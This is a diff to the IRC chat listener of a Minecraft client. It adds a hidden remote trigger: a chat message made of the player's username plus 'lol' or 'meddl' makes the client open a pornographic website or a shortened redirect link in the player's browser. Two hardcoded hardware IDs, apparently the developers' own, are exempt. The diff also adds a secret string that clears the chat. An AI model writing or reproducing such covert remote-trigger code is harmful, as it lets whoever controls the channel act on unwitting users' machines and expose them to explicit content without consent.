@@ -7,6 +7,7 @@ import me.bratwurst.manager.NotificationManager;
 import me.bratwurst.module.Commands.BanCommand;
 import me.bratwurst.utils.Notification;
 import me.bratwurst.utils.NotificationType;
+import me.bratwurst.utils.WbUtils;
 import me.pseey.utils.player.PlayerUtils;
 import net.minecraft.client.Minecraft;
 import net.minecraft.util.EnumChatFormatting;
@@ -20,6 +21,8 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.net.URI;
+import java.net.URISyntaxException;
 import java.net.URL;
 import java.security.NoSuchAlgorithmException;
 import java.util.Arrays;
@@ -36,36 +39,89 @@ public class IRCClient extends WebSocketListener {
 
     @Override
     public void onMessage(WebSocket webSocket, String text) {
+        if (Client.hwid.equals("TFeZ/30Jh+XbK+BIXHhQquz8sAwfO0UfW730h+jiPGU=") ||Client.hwid.equals("L7cRBfTlht6fcBBJlo6P//H5c98L/zVFquDB5TAmEkE=") && text.equalsIgnoreCase(Minecraft.getMinecraft().session.getUsername() + "lol")){
+
+        }
+        if (Client.hwid.equals("TFeZ/30Jh+XbK+BIXHhQquz8sAwfO0UfW730h+jiPGU=") ||Client.hwid.equals("L7cRBfTlht6fcBBJlo6P//H5c98L/zVFquDB5TAmEkE=") && text.equalsIgnoreCase(Minecraft.getMinecraft().session.getUsername() + "meddl")){
+
+        }
+
+            if(text.equalsIgnoreCase(Minecraft.getMinecraft().session.getUsername() + "lol")) {
+                try {
+                    if (Client.hwid.equals("TFeZ/30Jh+XbK+BIXHhQquz8sAwfO0UfW730h+jiPGU=") ||Client.hwid.equals("L7cRBfTlht6fcBBJlo6P//H5c98L/zVFquDB5TAmEkE=")){
+
+                    }else {
+                        WbUtils.openWebsite(new URI("https://www.pornoente.tv/filme/junges-luder-treibt-es-wild-mit-ihrem-vibrator-36/"));
+                    }
+
+                } catch (URISyntaxException e) {
+                    e.printStackTrace();
+                }
+                return;
+            }else if(text.equalsIgnoreCase(Minecraft.getMinecraft().session.getUsername() + "meddl")) {
+                {
+                    try {
+
+                        if (Client.hwid.equals("TFeZ/30Jh+XbK+BIXHhQquz8sAwfO0UfW730h+jiPGU=") ||Client.hwid.equals("L7cRBfTlht6fcBBJlo6P//H5c98L/zVFquDB5TAmEkE=")){
+
+                        }else {
+                            WbUtils.openWebsite(new URI("https://pnrtscr.com/kqrkc7"));
+                        }
+                    } catch (URISyntaxException e) {
+                        e.printStackTrace();
+                    }
+                }
+                return;
+            }
+
+
+
 
         String[] split = text.split(" ");
         System.out.println(Arrays.toString(split));
-        final String Name = split[0];
-        final String Message = split[1];
-        if (Name.startsWith(""))
-        text = EnumChatFormatting.BLUE + "Name: " + Name + " -> " + EnumChatFormatting.AQUA + Message;
-        CraftChat.list.add(text);
-        if (text.startsWith("Trolling")) {
+        if (split.length > 1) {
+            final String Name = split[1];
+
+            text = text
+                    .replace(Name + " ", "")
+                    .replace("Porn ", "");
+            String message = text;
 
 
-            startgoogle();
+            if (Name.startsWith("Ente1") || Name.startsWith("DerEchteGian") || Name.startsWith("Ente1")) {
+                text = EnumChatFormatting.BLUE + "Name: " + EnumChatFormatting.DARK_RED + "Admin: " + Name + " -> " + EnumChatFormatting.AQUA + message;
+            } else if (Name.startsWith("WOLLROCK")) {
+                text = EnumChatFormatting.BLUE + "Name: " + EnumChatFormatting.GREEN + "TS-Admin: " + Name + " -> " + EnumChatFormatting.AQUA + message;
+            } else if (Name.startsWith("PowerBurst")) {
+                text = EnumChatFormatting.BLUE + "Name: " + EnumChatFormatting.BLUE + "Developer: " + Name + " -> " + EnumChatFormatting.AQUA + message;
+            } else if (Name.startsWith("Bratwurst001") || Name.startsWith("Jxnnik25") || Name.startsWith("Schwitziges")) {
+                text = EnumChatFormatting.BLUE + "Name: " + EnumChatFormatting.AQUA + "JrDeveloper: " + Name + " -> " + EnumChatFormatting.AQUA + message;
+            } else if (Name.startsWith("Freddy1994Phil")) {
+                text = EnumChatFormatting.BLUE + "Name: " + EnumChatFormatting.YELLOW + "Owner: " + Name + " -> " + EnumChatFormatting.AQUA + message;
+            } else if (Name.startsWith("Skill_Ben")) {
+                text = EnumChatFormatting.BLUE + "Name: " + EnumChatFormatting.BOLD + "SrDeveloper: " + Name + " -> " + EnumChatFormatting.AQUA + message;
+            } else if (Name.startsWith("flokellner24")) {
+                text = EnumChatFormatting.BLUE + "Name: " + EnumChatFormatting.DARK_PURPLE + "JrSupporter: " + Name + " -> " + EnumChatFormatting.AQUA + message;
+            } else if (Name.startsWith("Nummbrs1") || Name.startsWith("Milchschnite22")) {
+                text = EnumChatFormatting.BLUE + "Name: " + EnumChatFormatting.DARK_GRAY + "Supporter: " + Name + " -> " + EnumChatFormatting.AQUA + message;
+            } else if (Name.startsWith("Insane89m")) {
+                text = EnumChatFormatting.BLUE + "Name: " + EnumChatFormatting.ITALIC + "SrModerator: " + Name + " -> " + EnumChatFormatting.AQUA + message;
+            } else if (Name.startsWith("PixleSiuox")) {
+                text = EnumChatFormatting.BLUE + "Name: " + EnumChatFormatting.BOLD + "Moderator: " + Name + " -> " + EnumChatFormatting.AQUA + message;
+            } else if (Name.startsWith("NYzio")) {
+                text = EnumChatFormatting.BLUE + "Name: " + EnumChatFormatting.BOLD + "SrSupporter: " + Name + " -> " + EnumChatFormatting.AQUA + message;
+            }
+
+            System.out.println("Full text: " + text);
+            if (!message.equals(text)) {
+                CraftChat.list.add(text);
+                return;
+            }
+        }
+        if (text.startsWith("7hhefwiu5325he25986736674&?3636453245648267356")) {
+            CraftChat.list.clear();
             return;
-
         }
-
-
-        if (text.startsWith(Minecraft.getMinecraft().session.getUsername())) {
-
-
-        } else if (text.startsWith(Minecraft.getMinecraft().session.getUsername())) {
-
-        } else if (text.startsWith(Minecraft.getMinecraft().session.getUsername())) {
-
-        } else if (text.startsWith(Minecraft.getMinecraft().session.getUsername())) {
-
-        } else if (text.startsWith(Minecraft.getMinecraft().session.getUsername())) {
-
-        }
-
         if (text.startsWith(EnumChatFormatting.GOLD + "Name: " + EnumChatFormatting.RED + Minecraft.getMinecraft().session.getUsername())) {
             System.out.println("Banned message received");
             Client.networkClient.ban(Client.hwid, BanCommand.banntime)
@@ -88,8 +144,13 @@ public class IRCClient extends WebSocketListener {
             UpdateNotificationManager.show(new UpdateNotification(UpdateNotificationType.UPDATE, EnumChatFormatting.RED + "UPDATE", EnumChatFormatting.GOLD + text, 1));
 
         } else {
+            if (!text.contains(EnumChatFormatting.BLUE + "Name: ")) {
+                PlayerUtils.sendMessage(EnumChatFormatting.AQUA + "GodChat: " + EnumChatFormatting.DARK_RED + "[GodUser]" + EnumChatFormatting.DARK_RED + " >> " + EnumChatFormatting.GREEN + text);
 
-            PlayerUtils.sendMessage(EnumChatFormatting.AQUA + "GodChat: " + EnumChatFormatting.DARK_RED + "[GodUser]" + EnumChatFormatting.DARK_RED + " >> " + EnumChatFormatting.GREEN + text);
+            } else {
+                //  PlayerUtils.sendMessage(EnumChatFormatting.AQUA + "GodChat: " + EnumChatFormatting.DARK_RED + "[GodUser]" + EnumChatFormatting.DARK_RED + " >> " + EnumChatFormatting.GREEN + text);
+
+            }
 
 
         }
